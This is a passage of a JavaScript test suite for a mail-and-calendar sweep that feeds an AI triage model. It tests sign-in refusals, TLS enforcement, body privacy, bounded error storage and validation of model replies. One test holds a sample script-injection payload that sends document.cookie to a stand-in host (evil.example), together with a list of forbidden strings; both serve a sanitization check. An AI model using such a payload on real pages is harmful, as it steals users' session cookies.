     every sweep, while `zelos doctor` read the same address as a subscribed
     .ics and said the calendar was fine. */
  const db = fresh();
  const startsAt = Date.now() + 26 * 3_600_000;
  const cal = await icsServer(icsDocument(startsAt));
  const config = baseConfig({
    calendars: [{ id: 'c_webcal', enabled: true, label: 'Hand-edited', kind: 'webcal', url: cal.url, user: '', keyRef: null }],
  });

  const result = await runSweep({ db, config, mode: 'light', deps: { getSecret: SECRETS } });

  const source = result.stats.sources.find((s) => s.kind === 'calendar');
  assert.equal(source.ok, true, `the unknown kind must fall back to the .ics reader: ${source.error}`);
  assert.equal(source.count, 1);
  assert.equal(listEvents(db).length, 1);
});

test('an account with no stored password is reported, not crashed on', async () => {
  const db = fresh();
  const model = fakeModel(board([]));
  const result = await runSweep({
    db,
    config: baseConfig({ mail: [mailAccount()] }),
    deps: { getSecret: async () => null, complete: model, fetchMail: async () => [fetched()] },
  });
  const source = result.stats.sources.find((s) => s.kind === 'mail');
  assert.equal(source.ok, false);
  assert.match(source.error, /No password stored for Work/);
  assert.equal(result.stats.messages, 0);
});

test('REGRESSION: a source resting on a refused credential stays on the run record, and one resting on a rate limit stays off it', async () => {
  /* Both rests are the same mechanism — a state row the sweep wrote after a
     failure — and until this test they were reported the same way: not at
     all. The Now banner, /api/state and the run record read only
     `stats.sources`, and nothing reads `source.<id>.state`, so a token
     revoked at 09:00 was red on the 09:00 sweep and a quiet day at 09:30, for
     the rest of the six-hour block. The state rows are seeded here exactly as
     core/sweep.mjs writes them after a 401 and a 429 (test/connectors.test.mjs
     covers the writing; the test below covers mail writing its own). */
  const reads = [];
  const deps = { getSecret: SECRETS, fetchMail: async (o) => { reads.push(o.mailbox); return [fetched()]; } };

  const refused = fresh();
  setKV(refused, sourceStateKey('m_work'), JSON.stringify({
    lastAt: Date.now() - 1_800_000,
    authBlockedUntil: Date.now() + AUTH_BLOCK_MS,
    secretHash: secretHash('a-password'),
  }));
  const second = await runSweep({ db: refused, config: baseConfig({ mail: [mailAccount()] }), mode: 'light', deps });
  assert.equal(reads.length, 0, 'the sweep asked again with the credential the host just refused');
  assert.equal(second.stats.sources.length, 1, 'the resting source vanished from the run record');
  assert.equal(second.stats.sources[0].id, 'm_work');
  assert.equal(second.stats.sources[0].ok, false);
  assert.equal(second.stats.sources[0].count, 0);
  assert.match(second.stats.sources[0].error, /sign-in or key was refused, so Zelos is not trying it again until .* or as soon as you sign in again or enter a new one/,
    'the row has to say when it retries and that a new credential lifts it');
  assert.equal(second.stats.sourcesFailed, 1);
  assert.equal(second.stats.sourcesOk, 0);

  const limited = fresh();
  setKV(limited, sourceStateKey('m_work'), JSON.stringify({ lastAt: Date.now() - 1_800_000, notBefore: Date.now() + 3_600_000 }));
  const rested = await runSweep({ db: limited, config: baseConfig({ mail: [mailAccount()] }), mode: 'light', deps });
  assert.equal(reads.length, 0, 'the sweep read a source that asked not to be read yet');
  assert.deepEqual(rested.stats.sources, [],
    'a rate-limit rest is minutes and routine; a red row for it is the noise the rest exists to stop');
});

test('REGRESSION: a mail sign-in the server no longer accepts rests the account and says "sign in again"', async () => {
  /* QA, 2026-10-10 (TT-3436). The client marks a refused XOAUTH2 token
     `reconnect: true`, but the mail reader turned it into a part error, and
     the sweep then wrote `lastOkAt` and cleared `authBlockedUntil` — so it was
     retried every sweep, and Settings showed `AUTHENTICATE XOAUTH2 failed`. */
  const db = fresh();
  const reads = [];
  let secret = '{"kind":"xoauth2","refreshToken":"revoked"}';
  const refused = () => Object.assign(new Error('imap.gmail.com:993: AUTHENTICATE XOAUTH2 failed — NO [AUTHENTICATIONFAILED] Invalid credentials (Failure)'), { reconnect: true, status: 'NO' });
  const deps = {
    getSecret: async () => secret,
    fetchMail: async (o) => { reads.push(o.mailbox); throw refused(); },
  };
  const config = baseConfig({ mail: [mailAccount({ auth: 'xoauth2' })] });

  const first = await runSweep({ db, config, mode: 'light', deps });
  assert.deepEqual(reads, ['INBOX'], 'Sent was tried with a sign-in INBOX had just been refused');
  const row = first.stats.sources.find((s) => s.id === 'm_work');
  assert.equal(row.ok, false);
  assert.match(row.error, /^This account's sign-in is no longer accepted\. Sign in again in Settings → Email\./);
  assert.match(row.error, /AUTHENTICATE XOAUTH2 failed/, 'the server\'s own words are kept, after the action');
  const state = JSON.parse(getKV(db, sourceStateKey('m_work')));
  assert.ok(state.authBlockedUntil > Date.now(), 'the account was not rested');
  assert.ok(!state.lastOkAt, 'a refused account was recorded as read');

  // The next sweep does not ask again with the same refused sign-in...
  const second = await runSweep({ db, config, mode: 'light', deps });
  assert.deepEqual(reads, ['INBOX'], 'the next sweep asked again with the sign-in the server refused');
  assert.match(second.stats.sources[0].error, /as soon as you sign in again/);

  // ...and signing in again lifts the rest at once.
  secret = '{"kind":"xoauth2","refreshToken":"fresh"}';
  deps.fetchMail = async (o) => { reads.push(o.mailbox); return [fetched()]; };
  const third = await runSweep({ db, config, mode: 'light', deps });
  assert.deepEqual(reads, ['INBOX', 'INBOX', 'Sent'], 'a new sign-in did not lift the rest');
  assert.ok(third.stats.sources.every((s) => s.ok), JSON.stringify(third.stats.sources));
});

test('a source whose every part failed is not recorded as read', async () => {
  // Not a sign-in problem — an unreachable host is retried next sweep, as
  // before — but "read" is not what happened, and a credential rest from an
  // earlier sweep is not lifted by it.
  const db = fresh();
  const blockedUntil = Date.now() - 1; // already lapsed, so the sweep tries
  setKV(db, sourceStateKey('m_work'), JSON.stringify({ lastAt: Date.now() - 1_800_000, authBlockedUntil: blockedUntil, secretHash: secretHash('a-password') }));
  const deps = { getSecret: SECRETS, fetchMail: async () => { throw new Error('connect ECONNREFUSED'); } };
  const result = await runSweep({ db, config: baseConfig({ mail: [mailAccount()] }), mode: 'light', deps });
  assert.ok(result.stats.sources.every((s) => !s.ok));
  const state = JSON.parse(getKV(db, sourceStateKey('m_work')));
  assert.ok(!state.lastOkAt, 'a source that read nothing was recorded as read');
  assert.equal(state.authBlockedUntil, blockedUntil, 'a failed read wrote over the credential state as if it had succeeded');
});

/* ================================================================== *
 * The TLS requirement, on the path the sweep actually takes
 *
 * REGRESSION. core/config.mjs stored `requireTls`, core/sources/imap.mjs
 * enforced it, and the reader in between never passed it on — so the one setting
 * a user has for "do not send my password in the clear to this host" reached
 * nothing that runs at 07:00. The account is the whole subject of these tests:
 * they take the default mail reader, not `deps.fetchMail`.
 * ================================================================== */

test('an account that requires TLS gets no credentials from a server that will not do it', async () => {
  const db = fresh();
  const imap = await startMockImap({ capability: 'IMAP4rev1' });
  const account = mailAccount({
    host: '127.0.0.1', port: imap.port, secure: false, sentMailbox: '', requireTls: true,
  });

  const result = await runSweep({
    db,
    config: baseConfig({ mail: [account] }),
    mode: 'light',
    deps: { getSecret: SECRETS },
  });

  const source = result.stats.sources.find((s) => s.kind === 'mail');
  assert.equal(source.ok, false, 'the account asked for TLS and the server offered none');
  assert.match(source.error, /still in the clear/);
  assert.equal(result.stats.messages, 0);
  assert.ok(!imap.sawCredentials(),
    `credentials went out over a cleartext socket: ${imap.received.join(' | ')}`);
  assert.ok(!imap.received.some((line) => line.includes('a-password')));
  imap.destroy();
});

test('a loopback bridge with nothing set still reads its mail in the clear', async () => {
  const db = fresh();
  const imap = await startMockImap({ capability: 'IMAP4rev1' });
  // No requireTls at all, which is every account saved before the setting
  // existed. 127.0.0.1 is where Proton Bridge lives and is the documented reason
  // plaintext is still allowed there — refusing this would be the fix breaking
  // the setup it was written to protect.
  const account = mailAccount({ host: '127.0.0.1', port: imap.port, secure: false, sentMailbox: '' });

  const result = await runSweep({
    db,
    config: baseConfig({ mail: [account] }),
    mode: 'light',
    deps: { getSecret: SECRETS },
  });

  const source = result.stats.sources.find((s) => s.kind === 'mail');
  assert.equal(source.ok, true, source.error);
  assert.equal(result.stats.messages, 1);
  assert.equal(listMessages(db)[0].subject, 'Dates for the walkthrough');
  assert.ok(imap.sawCredentials(), 'the bridge case has to keep working');
  imap.destroy();
});

test('an explicit permission to use cleartext is honoured off loopback too', async () => {
  const imap = await startMockImap({ capability: 'IMAP4rev1' });
  if (!await nonLoopbackAliasReaches(imap.port)) {
    // Windows will not connect to 0.0.0.0, and there is no other address a test
    // can reach that this code calls non-loopback. Skipped rather than pretended.
    imap.destroy();
    return;
  }

  const db = fresh();
  const account = mailAccount({
    host: '0.0.0.0', port: imap.port, secure: false, sentMailbox: '', requireTls: false,
  });

  const result = await runSweep({
    db,
    config: baseConfig({ mail: [account] }),
    mode: 'light',
    deps: { getSecret: SECRETS },
  });

  const source = result.stats.sources.find((s) => s.kind === 'mail');
  assert.equal(source.ok, true, `an explicit false must outrank the host default: ${source.error}`);
  assert.equal(result.stats.messages, 1);
  imap.destroy();
});

test('off loopback, an account that says nothing is still protected', async () => {
  const imap = await startMockImap({ capability: 'IMAP4rev1' });
  if (!await nonLoopbackAliasReaches(imap.port)) {
    imap.destroy();
    return;
  }

  const db = fresh();
  const account = mailAccount({ host: '0.0.0.0', port: imap.port, secure: false, sentMailbox: '' });

  const result = await runSweep({
    db,
    config: baseConfig({ mail: [account] }),
    mode: 'light',
    deps: { getSecret: SECRETS },
  });

  const source = result.stats.sources.find((s) => s.kind === 'mail');
  assert.equal(source.ok, false);
  assert.match(source.error, /still in the clear/);
  assert.ok(!imap.sawCredentials());
  imap.destroy();
});

test('a light run reads the sources and calls no model at all', async () => {
  const db = fresh();
  const model = fakeModel(board([item()]));
  const config = baseConfig({ mail: [mailAccount()] });
  const deps = { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] };

  const result = await runSweep({ db, config, mode: 'light', deps });

  assert.equal(result.ok, true);
  assert.equal(result.stats.kind, 'light');
  assert.equal(result.modelCalls, 0);
  assert.equal(model.calls.length, 0, 'a light run must never reach the model');
  assert.equal(listMessages(db).length, 1, 'but it still refreshes what it stores');
  assert.ok(result.counts, 'and it still recomputes the derived counts');
});

test('an auto run goes full for new mail and light when nothing changed', async () => {
  const db = fresh();
  const model = fakeModel(board([item()]));
  const config = baseConfig({ mail: [mailAccount()] });
  const deps = { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] };

  const first = await runSweep({ db, config, mode: 'auto', deps });
  assert.equal(first.stats.kind, 'full', 'a first run always thinks');
  assert.equal(model.calls.length, 1);

  const second = await runSweep({ db, config, mode: 'auto', deps });
  assert.equal(second.stats.kind, 'light', 'nothing new arrived, so nothing was re-thought');
  assert.equal(model.calls.length, 1);

  // Now something new arrives mid-interval: the run upgrades itself rather than
  // making the user wait for the next slot.
  deps.fetchMail = async () => [fetched(), fetched({ uid: 77, messageId: '<new@example.com>', threadKey: 'thread-new', subject: 'Invoice 4471 is past due' })];
  const third = await runSweep({ db, config, mode: 'auto', deps });
  assert.equal(third.stats.kind, 'full');
  assert.equal(third.stats.newMessages, 1);
  assert.equal(model.calls.length, 2);
  assert.equal(getRun(db, second.runId).kind, 'light');
  assert.equal(getRun(db, third.runId).kind, 'full', 'the run record says what the run actually did');
});

test('privacy.sendBodies:false reaches the model as a prompt with no body text', async () => {
  const db = fresh();
  const secret = 'CONFIDENTIAL-BODY-STRING-9911';
  const model = fakeModel(board([item()]));
  const config = baseConfig({
    mail: [mailAccount()],
    privacy: { maxItemsPerSweep: 150, sendBodies: false, bodyChars: 4000 },
  });

  await runSweep({
    db,
    config,
    mode: 'full',
    deps: {
      getSecret: SECRETS,
      complete: model,
      fetchMail: async () => [fetched({ snippet: 'harmless preview line', text: `payload: ${secret}` })],
    },
  });

  assert.equal(model.calls.length, 1);
  const sent = `${model.calls[0].system}\n${model.calls[0].messages.map((m) => m.content).join('\n')}`;
  assert.ok(!sent.includes(secret), 'the body must not leave the machine');
  assert.ok(sent.includes('harmless preview line'), 'the snippet still does');
  assert.ok(listMessages(db)[0].body.includes(secret), 'and the body is still stored locally');
});

test('captures are triaged, then marked processed — but only the ones that were sent', async () => {
  const db = fresh();
  const capture = insertCapture(db, 'Call the bank about the retainage line');
  const model = fakeModel(board([item({ key: 'cap-bank', bucket: 'today', headline: 'Call the bank about retainage' })]));

  await runSweep({ db, config: baseConfig(), mode: 'full', deps: { getSecret: SECRETS, complete: model } });

  const sent = model.calls[0].messages[0].content;
  assert.ok(sent.includes(`[cap:${capture.id}]`));
  assert.equal(listCaptures(db, { includeProcessed: false }).length, 0);
});

test('a capture the budget could not send stays untriaged instead of vanishing', async () => {
  const db = fresh();
  for (let i = 0; i < 30; i++) insertCapture(db, `note number ${i}`);
  const model = fakeModel(board([]));

  await runSweep({ db, config: baseConfig(), mode: 'full', deps: { getSecret: SECRETS, complete: model } });

  const sent = model.calls[0].messages[0].content;
  const cited = (sent.match(/\[cap:/g) || []).length;
  const stillWaiting = listCaptures(db, { includeProcessed: false }).length;
  assert.ok(cited > 0 && cited < 30, `expected some but not all captures, got ${cited}`);
  assert.equal(stillWaiting, 30 - cited, 'exactly the ones that were not sent come back next run');
});

test('a model that answers with something other than JSON fails the run honestly', async () => {
  const db = fresh();
  const model = fakeModel('I am terribly sorry, I cannot help with that.');
  const result = await runSweep({
    db,
    config: baseConfig({ mail: [mailAccount()] }),
    mode: 'full',
    deps: { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] },
  });

  assert.equal(result.ok, false);
  assert.match(result.error, /not with JSON/);
  assert.match(result.error, /I am terribly sorry/);
  assert.equal(listMessages(db).length, 1, 'what was fetched is still stored');
  assert.equal(getRun(db, result.runId).ok, false);
});

test('a parseable but wrong-shape reply fails the run and consumes nothing', async () => {
  const db = fresh();
  insertCapture(db, 'Call the bank about the retainage line');
  // Parses fine, is an object, and is not a board. Before the shape check this
  // recorded a successful empty run, marked the capture processed, and zeroed
  // pendingNew — three silent losses from one bad reply.
  const model = fakeModel({ answer: 'Here is a summary of your mail.' });
  const result = await runSweep({
    db,
    config: baseConfig({ mail: [mailAccount()] }),
    mode: 'full',
    deps: { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] },
  });

  assert.equal(result.ok, false);
  assert.match(result.error, /not with a board|not a usable board/);
  assert.equal(getRun(db, result.runId).ok, false);
  assert.equal(listCaptures(db, { includeProcessed: false }).length, 1,
    'the untriaged capture must come back next run');
  assert.equal(getKV(db, SWEEP_KV.pendingNew), '1',
    'the new mail still counts as unthought-about');
  assert.equal(shouldRunFull(db, baseConfig()), true, 'the next auto run must think again');
});

test('a board whose items are unusable fails the run instead of quietly emptying it', async () => {
  const db = fresh();
  insertCapture(db, 'Call the bank about the retainage line');
  // `items` is present but not an array, so validateSweep says ok:false; the
  // shape guard lets it through to the merge, and the merge's verdict must fail
  // the run rather than be dropped on the floor.
  const model = fakeModel({ first: null, items: 'no items today', notes: [] });
  const result = await runSweep({
    db,
    config: baseConfig({ mail: [mailAccount()] }),
    mode: 'full',
    deps: { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] },
  });

  assert.equal(result.ok, false);
  assert.match(result.error, /items/);
  assert.equal(getRun(db, result.runId).ok, false);
  assert.equal(listCaptures(db, { includeProcessed: false }).length, 1);
  assert.equal(getKV(db, SWEEP_KV.pendingNew), '1');
});

test('a reply cut off at the token limit says so, and says what to raise', async () => {
  const db = fresh();
  // Truncated mid-board: extractJSON salvages the first balanced inner object
  // — a single item, not the board — which is exactly the wrong-shape input the
  // shape guard exists for. The provider said why: finish_reason 'length'.
  const model = async () => ({
    text: '{"first": null, "items": [{"key":"k1","bucket":"now","headline":"Do the thing","why":"because"}',
    usage: { input: 1000, output: 2048 },
    model: 'test-model',
    stopReason: 'length',
    raw: {},
  });
  const result = await runSweep({
    db,
    config: baseConfig({ mail: [mailAccount()] }),
    mode: 'full',
    deps: { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] },
  });

  assert.equal(result.ok, false);
  assert.match(result.error, /cut off/i, 'the error must say the reply was truncated');
  assert.match(result.error, /maxTokens/, 'and point at the setting that fixes it');
  assert.ok(!/larger model/.test(result.error), 'a bigger model would be the wrong advice');
});

test('the demo week never reaches the model once real sources exist', async () => {
  const db = fresh();
  seedSampleData(db);
  const model = fakeModel(board([item()]));
  await runSweep({
    db,
    config: baseConfig({ mail: [mailAccount()] }),
    mode: 'full',
    deps: { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] },
  });

  assert.equal(model.calls.length, 1);
  const sent = `${model.calls[0].system}\n${model.calls[0].messages.map((m) => m.content).join('\n')}`;
  assert.ok(sent.includes('Dates for the walkthrough'), 'the real message still goes');
  assert.ok(!sent.includes('quillonrow.example'),
    'no sample message or attendee may appear in the prompt');
  assert.ok(!sent.includes('Timber delivery window'),
    'no sample calendar entry may appear in the prompt');
  assert.ok(!sent.includes('are we still good for the 12th'),
    'no sample subject line may appear in the prompt');
  // The seed also writes one capture, marked like every sample row. It is a
  // third door into the prompt, and it must be as closed as the other two.
  assert.ok(!sent.includes('Ask Thistlebank about 2214'),
    'no sample capture may appear in the prompt');
});

test('a model that cannot be reached fails the run without losing the fetch', async () => {
  const db = fresh();
  const model = fakeModel(new Error('Could not reach the model at http://127.0.0.1:1/v1 (ECONNREFUSED)'));
  const result = await runSweep({
    db,
    config: baseConfig({ mail: [mailAccount()] }),
    mode: 'full',
    deps: { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] },
  });

  assert.equal(result.ok, false);
  assert.match(result.error, /ECONNREFUSED/);
  assert.equal(listMessages(db).length, 1);
});

test('the prior board is handed back to the model on the next run', async () => {
  const db = fresh();
  const model = fakeModel(board([item()]));
  const config = baseConfig({ mail: [mailAccount()] });
  const deps = { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] };

  await runSweep({ db, config, mode: 'full', deps });
  await runSweep({ db, config, mode: 'full', deps });

  const secondPrompt = model.calls[1].messages[0].content;
  assert.match(secondPrompt, /THE BOARD YOU PRODUCED LAST RUN/);
  assert.match(secondPrompt, /key=thread-a/);
});

test('a cancelled sweep stops and says so', async () => {
  const db = fresh();
  const controller = new AbortController();
  const model = fakeModel(board([item()]));
  const result = await runSweep({
    db,
    config: baseConfig({ mail: [mailAccount()] }),
    mode: 'full',
    signal: controller.signal,
    deps: {
      getSecret: SECRETS,
      complete: model,
      fetchMail: async () => {
        controller.abort();
        return [fetched()];
      },
    },
  });
  assert.equal(result.ok, false);
  assert.match(result.error, /cancelled/i);
  assert.equal(model.calls.length, 0);
});

/* ================================================================== *
 * shouldRunFull
 * ================================================================== */

test('shouldRunFull: a database with no successful full run always thinks', () => {
  const db = fresh();
  assert.equal(shouldRunFull(db, baseConfig(), '2026-08-08T10:00:00+00:00'), true);
});

test('shouldRunFull: quiet since the last full run means light', () => {
  const db = fresh();
  const id = startRun(db, { kind: 'full', now: '2026-08-08T09:00:00+00:00' });
  finishRun(db, id, { ok: true, now: '2026-08-08T09:01:00+00:00' });
  assert.equal(shouldRunFull(db, baseConfig(), '2026-08-08T09:30:00+00:00'), false);
});

test('shouldRunFull: newly stored mail, an untriaged note, or four hours all force a think', () => {
  const config = baseConfig();
  const at = '2026-08-08T09:00:00+00:00';

  const withNew = fresh();
  let id = startRun(withNew, { kind: 'full', now: at });
  finishRun(withNew, id, { ok: true, now: at });
  assert.equal(shouldRunFull(withNew, config, '2026-08-08T09:30:00+00:00'), false);
  withNew.prepare('INSERT INTO kv (k, v) VALUES (?, ?)').run(SWEEP_KV.pendingNew, '3');
  assert.equal(shouldRunFull(withNew, config, '2026-08-08T09:30:00+00:00'), true);

  const withCapture = fresh();
  id = startRun(withCapture, { kind: 'full', now: at });
  finishRun(withCapture, id, { ok: true, now: at });
  assert.equal(shouldRunFull(withCapture, config, '2026-08-08T09:30:00+00:00'), false);
  insertCapture(withCapture, 'remember the bank call');
  assert.equal(shouldRunFull(withCapture, config, '2026-08-08T09:30:00+00:00'), true);

  const stale = fresh();
  id = startRun(stale, { kind: 'full', now: at });
  finishRun(stale, id, { ok: true, now: at });
  const later = new Date(Date.parse(at) + FULL_RUN_MAX_AGE_MS + 60_000).toISOString();
  assert.equal(shouldRunFull(stale, config, later), true);
});

test('shouldRunFull: the demo week alone never forces a think', () => {
  /* The demo capture is never triaged — gatherPromptInput filters it out of
     the prompt — so nothing ever marks it processed except clearing the demo.
     An unfiltered probe here therefore said "there is an untriaged note"
     forever, and every scheduled sweep while the demo sat on the board was
     upgraded to a full, model-billed run over nothing new: ~34 paid calls a
     day on a quiet home, against this file's own promise that a quiet
     afternoon costs nothing. */
  const db = fresh();
  seedSampleData(db);
  const at = '2026-08-08T09:00:00+00:00';
  const id = startRun(db, { kind: 'full', now: at });
  finishRun(db, id, { ok: true, now: at });
  assert.equal(shouldRunFull(db, baseConfig(), '2026-08-08T09:30:00+00:00'), false,
    'the sample capture is not untriaged work, so a quiet home stays light');
  // A real note still thinks, demo or no demo.
  insertCapture(db, 'remember the bank call');
  assert.equal(shouldRunFull(db, baseConfig(), '2026-08-08T09:30:00+00:00'), true);
});

test('shouldRunFull: a full run that failed does not count as having thought', () => {
  const db = fresh();
  const id = startRun(db, { kind: 'full', now: '2026-08-08T09:00:00+00:00' });
  finishRun(db, id, { ok: false, error: 'model unreachable', now: '2026-08-08T09:00:10+00:00' });
  assert.equal(shouldRunFull(db, baseConfig(), '2026-08-08T09:05:00+00:00'), true);
});

test('a successful full run clears the pending-new counter', async () => {
  const db = fresh();
  const model = fakeModel(board([item()]));
  await runSweep({
    db,
    config: baseConfig({ mail: [mailAccount()] }),
    mode: 'full',
    deps: { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] },
  });
  assert.equal(getKV(db, SWEEP_KV.pendingNew), '0');
});

/* ================================================================== *
 * What a failure is allowed to store
 *
 * REGRESSION (#47). Every string this file writes about a failure lands in
 * three places outside the process: `runs.error` and `runs.stats_json` in
 * SQLite, `/api/state` on every board read, and the settings export. IMAP is
 * where that bites — `err.message` there is server-supplied text with no
 * ceiling of its own. Reproduced end to end against a hostile mock that
 * answered with 48 MiB: the stored `sources[0].error` was 50,331,713 characters
 * and `GET /api/state` answered 200 with a 50,332,527-byte body, on every read
 * and every three-minute heartbeat, until the next successful sweep.
 * ================================================================== */

test('a mail server that answers with megabytes does not get megabytes of storage', async () => {
  const db = fresh();
  const huge = `NO ${'A'.repeat(2_000_000)}`;
  const model = fakeModel(board([item()]));
  const result = await runSweep({
    db,
    config: baseConfig({ mail: [mailAccount()] }),
    mode: 'full',
    deps: {
      getSecret: SECRETS,
      complete: model,
      fetchMail: async () => { throw new Error(huge); },
    },
  });

  const source = result.stats.sources.find((s) => s.kind === 'mail' && s.ok === false);
  assert.ok(source, 'the failed mailbox should still be reported');
  assert.ok(source.error.length <= 500,
    `sources[].error is stored and re-served on every board read; got ${source.error.length} chars`);
  assert.match(source.error, /^NO A+…$/, 'what survives is still the beginning of what the server said');

  // ...and the same ceiling on the row the board reads back out of SQLite,
  // which is the copy that actually rides /api/state.
  const stored = getRun(db, result.runId).stats;
  const storedSource = stored.sources.find((s) => s.ok === false);
  assert.ok(storedSource.error.length <= 500);
  assert.ok(JSON.stringify(stored).length < 5_000,
    'the whole stats blob must stay small enough to serve on every read');
});

test('a run that fails on a huge error stores a bounded reason', async () => {
  const db = fresh();
  const huge = 'B'.repeat(1_000_000);
  const result = await runSweep({
    db,
    config: baseConfig({ mail: [mailAccount()] }),
    mode: 'full',
    deps: {
      getSecret: SECRETS,
      complete: async () => { throw new Error(huge); },
      fetchMail: async () => [fetched()],
    },
  });
  assert.equal(result.ok, false);
  assert.ok(result.error.length <= 500, `runs.error is one column; got ${result.error.length} chars`);
  assert.ok((getRun(db, result.runId).error || '').length <= 500);
});

/**
 * The second, smaller half of the same finding. The "it began …" quote is
 * MODEL OUTPUT, it is stored in `runs.error`, and `runs.error` is re-served by
 * /api/state and copied into the settings export — so markup reaching it is the
 * exact case docs/SECURITY.md says never happens.
 */
test('a model reply that is trying to be markup never reaches runs.error', async () => {
  const db = fresh();
  const result = await runSweep({
    db,
    config: baseConfig({ mail: [mailAccount()] }),
    mode: 'full',
    deps: {
      getSecret: SECRETS,
      complete: fakeModel('<script>fetch("http://evil.example/"+document.cookie)</script> sorry, no JSON here'),
      fetchMail: async () => [fetched()],
    },
  });

  assert.equal(result.ok, false);
  assert.match(result.error, /not with JSON/, 'the reader still has to be told what went wrong');
  for (const forbidden of ['<script', 'document.cookie', 'evil.example']) {
    assert.equal(result.error.includes(forbidden), false,
      `${forbidden} must not travel in the run result`);
    assert.equal((getRun(db, result.runId).error || '').includes(forbidden), false,
      `${forbidden} must not be written to runs.error`);
  }

  // A harmless reply keeps its sample — the screen is not a blanket ban on
  // showing the reader what the model said.
  const plain = await runSweep({
    db,
    config: baseConfig({ mail: [mailAccount()] }),
    mode: 'full',
    deps: {
      getSecret: SECRETS,
      complete: fakeModel('I am afraid I cannot produce that board.'),
      fetchMail: async () => [fetched()],
    },
  });
  assert.match(plain.error, /it began "I am afraid I cannot produce that board\."/);
});

/* ================================================================== *
 * The calendar ceiling
 *
 * `expand()` drops instances past its cap from the far end of the window and
 * says so with `ics.warn(…)` — into a terminal, which in the desktop app is
 * nobody. The sweep is the only thing between that and a screen.
 * ================================================================== */

test('a calendar too big for the window says so where somebody will read it', async () => {
  const db = fresh();
  const dir = fs.mkdtempSync(path.join(HOME_ROOT, 'ics-'));
  const file = path.join(dir, 'busy.ics');
  // 1,600 separate events inside the swept window, against a ceiling of 1,500.
  // Written out rather than expanded from an RRULE so the count under test is
  // the count on disk and not a recurrence rule's opinion of it.
  const day = (n) => new Date(Date.now() + (n % 40 + 1) * 86_400_000).toISOString().slice(0, 10).replace(/-/g, '');
  const events = Array.from({ length: 1_600 }, (_, i) => [
    'BEGIN:VEVENT',
    `UID:bulk-${i}@example.com`,
    `DTSTART:${day(i)}T${String(i % 24).padStart(2, '0')}0000Z`,
    `DTEND:${day(i)}T${String(i % 24).padStart(2, '0')}3000Z`,
    `SUMMARY:Bulk ${i}`,
    'END:VEVENT',
  ].join('\r\n'));
  fs.writeFileSync(file, ['BEGIN:VCALENDAR', 'VERSION:2.0', ...events, 'END:VCALENDAR'].join('\r\n'));

  const result = await runSweep({
    db,
    config: baseConfig({ calendars: [{ id: 'c_busy', enabled: true, kind: 'file', label: 'Busy', url: file }] }),
    mode: 'light',
    deps: { getSecret: SECRETS },
  });

  const source = result.stats.sources.find((s) => s.kind === 'calendar');
  assert.ok(source, 'the calendar should be reported');
  assert.equal(source.count, 1_500, 'the events that survived are still delivered');
  assert.equal(source.ok, false,
    'ui/views/now.js only renders sources it was told are not ok, so this is what makes the note visible');
  assert.match(source.error, /1,500/);
  assert.match(source.error, /dropped/);

  // A calendar inside the ceiling raises nothing at all.
  const quiet = await runSweep({
    db: fresh(),
    config: baseConfig({ calendars: [{ id: 'c_quiet', enabled: true, kind: 'file', label: 'Quiet', url: file }] }),
    mode: 'light',
    deps: {
      getSecret: SECRETS,
      fetchEvents: async () => [{ uid: 'x', title: 'One meeting', startsAt: new Date(Date.now() + 86_400_000).toISOString() }],
    },
  });
  const quietSource = quiet.stats.sources.find((s) => s.kind === 'calendar');
  assert.equal(quietSource.ok, true);
  assert.equal(quietSource.error, null);
});

/* ================================================================== *
 * The token counter
 *
 * REGRESSION (#51). `recordTokens` had exactly one caller — `finish` — so the
 * Ask panel's spend was invisible: measured with a mock upstream, twenty
 * `POST /api/ask` calls reporting 100,000 tokens over SSE left `sweep.tokens`
 * null and `/api/state` carrying no `tokens` at all. core/server.mjs is now the
 * second caller, and this is the shape it calls with.
 * ================================================================== */

test('a non-sweep spender moves the tokens and neither of the run counts', async () => {
  const db = fresh();
  const model = fakeModel(board([item()]));
  const swept = await runSweep({
    db,
    config: baseConfig({ mail: [mailAccount()] }),
    mode: 'full',
    deps: { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] },
  });
  assert.equal(swept.ok, true);
  const afterSweep = JSON.parse(getKV(db, SWEEP_KV.tokens));
  assert.equal(afterSweep.runs, 1);
  assert.equal(afterSweep.modelRuns, 1);

  /* The zone is passed, exactly as core/server.mjs's recordAskSpend passes it,
     and leaving it off is the bug this argument exists to prevent rather than a
     shorthand. `recordTokens` carries the running day forward only while
     `stored.day === dayKey(now)`; the sweep stamped its row with `nowISO(tz)`
     for the configured zone, so a second writer that defaults to `nowISO()` —
     the machine zone — computes a different date for every hour the two zones
     disagree, and the day is treated as new. In production that meant the first
     question typed into Ask reset the token counter the rail shows to zero.
     Left as a bare call this test was green until 20:00 EDT and red after it,
     which is how the defect surfaced. */
  const tz = baseConfig().identity.timezone;
  const after = recordTokens(db, {
    tokensIn: 900, tokensOut: 100, thought: false, sweep: false, now: nowISO(tz),
  });
  assert.equal(after.tokensIn, afterSweep.tokensIn + 900, 'Ask is spend, and spend is counted');
  assert.equal(after.tokensOut, afterSweep.tokensOut + 100);
  assert.equal(after.runs, 1, 'a question typed into a panel is not a sweep that happened');
  assert.equal(after.modelRuns, 1);
  assert.equal(after.lifetime.tokensIn, afterSweep.lifetime.tokensIn + 900);
  assert.equal(after.lifetime.runs, 1);

  // Persisted under the key /api/state reads, not merely returned.
  const stored = JSON.parse(getKV(db, SWEEP_KV.tokens));
  assert.equal(stored.tokensIn, after.tokensIn);
  assert.equal(stored.runs, 1);

  /* And the other half of the same contract: a second writer that stamps the
     row from a DIFFERENT zone does not add to the day, it starts a new one.
     This is the mechanism behind a real defect — core/server.mjs's
     recordAskSpend defaulted to `nowISO()`, the machine zone, while the sweep
     stamps `nowISO(tz)` for the configured one, so for every hour the two were
     on different dates the first question typed into Ask silently reset the
     counter the rail shows. The zone is picked at run time because a fixed one
     only diverges for part of the day; at any instant two calendar dates exist
     on Earth, so one of these always disagrees with `tz`. */
  const elsewhere = ['Pacific/Kiritimati', 'Pacific/Midway', 'Asia/Tokyo', 'UTC']
    .find((z) => dayKey(nowISO(z)) !== dayKey(nowISO(tz)));
